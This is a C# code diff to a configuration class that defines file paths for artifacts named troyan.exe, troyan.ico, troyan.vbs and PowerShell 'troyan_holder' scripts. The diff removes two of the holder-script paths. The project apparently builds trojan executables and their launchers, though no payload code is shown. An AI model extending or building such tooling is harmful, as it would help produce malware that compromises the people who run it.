@@ -68,7 +68,6 @@ namespace model
         [JsonPropertyName("troyanOutputBlock")] public string TroyanOutputBlock => Path.Join(TroyanOutputDir, @".\block");
         
         [JsonPropertyName("userTroyanBlock")] public string UserTroyanMono => Path.Join(UserDataDir, @".\block");
-        [JsonPropertyName("userTroyanHolder")] public string UserTroyanHolder => Path.Join(UserDataDir, "troyan_holder.ps1");
         [JsonPropertyName("userTroyanExe")] public string UserTroyanExe => Path.Join(UserDataDir, "troyan.exe");
         [JsonPropertyName("userTroyanIco")] public string UserTroyanIco => Path.Join(UserDataDir, "troyan.ico");
         
@@ -81,8 +80,7 @@ namespace model
         [JsonPropertyName("userTroyanExeMono")] public string UserTroyanExeMono => Path.Join(UserDataDir, "troyan_mono.exe");
         [JsonPropertyName("troyanHolderMono")] public string TroyanHolderMono => Path.Join(TroyanOutputDir, "troyan_holder_mono.ps1");
         [JsonPropertyName("troyanHolderCleanMono")] public string TroyanHolderCleanMono => Path.Join(TroyanOutputDir, "troyan_holder_mono.c.ps1");
-        [JsonPropertyName("userTroyanHolderMono")] public string UserTroyanHolderMono => Path.Join(UserDataDir, "troyan_holder_mono.ps1");
-        
+       
         
         [JsonPropertyName("troyanVbsDir")] public string TroyanVbsDir => ServerModelLoader.TroyanVbsDirStatic;
         [JsonPropertyName("troyanVbsFile")] public string TroyanVbsFile => Path.Join(TroyanOutputDir, "troyan.vbs");
